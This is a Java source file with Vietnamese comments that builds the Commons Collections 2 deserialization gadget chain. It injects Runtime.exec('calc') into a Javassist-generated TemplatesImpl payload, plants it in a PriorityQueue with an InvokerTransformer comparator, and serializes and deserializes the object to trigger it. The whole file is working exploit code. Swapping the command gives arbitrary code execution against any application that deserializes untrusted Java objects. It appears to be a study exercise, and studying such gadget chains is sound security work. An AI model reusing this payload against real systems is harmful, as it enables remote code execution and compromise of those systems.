package org.example;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class CC2 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool = ClassPool.getDefault(); // lấy ClassPool mặc định
        classPool.appendClassPath(AbstractTranslet); // thêm đường dẫn tìm kiếm cho AbstractTranslet
        CtClass payload = classPool.makeClass("CommonsCollections22222222222"); // tạo một class public mới
        payload.setSuperclass(classPool.get(AbstractTranslet));  // đặt superclass của class mới là AbstractTranslet
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        // tạo static initializer và chèn nội dung thực thi lệnh

        byte[] bytes = payload.toBytecode();// chuyển class thành bytecode

        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();// tạo TemplatesImpl bằng reflection

        Field field = templatesImpl.getClass().getDeclaredField("_bytecodes"); // lấy field _bytecodes
        field.setAccessible(true); // cho phép truy cập
        field.set(templatesImpl,new byte[][]{bytes}); // gán bytecode payload vào _bytecodes

        Field field1 = templatesImpl.getClass().getDeclaredField("_name"); // lấy field _name
        field1.setAccessible(true); //  cho phép truy cập
        field1.set(templatesImpl,"test"); // gán _name = "test"

        InvokerTransformer transformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});

        TransformingComparator comparator = new TransformingComparator(transformer); // bọc transformer bằng comparator

        PriorityQueue queue = new PriorityQueue(2); // tạo PriorityQueue với capacity = 2
        queue.add(1);
        queue.add(1);

        Field field2 = queue.getClass().getDeclaredField("comparator"); // lấy field comparator
        field2.setAccessible(true);
        field2.set(queue,comparator); // thay comparator mặc định

        Field field3 = queue.getClass().getDeclaredField("queue"); // lấy mảng nội bộ queue
        field3.setAccessible(true);
        field3.set(queue,new Object[]{templatesImpl,templatesImpl});
        // thay nội dung queue bằng TemplatesImpl

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();
    }
}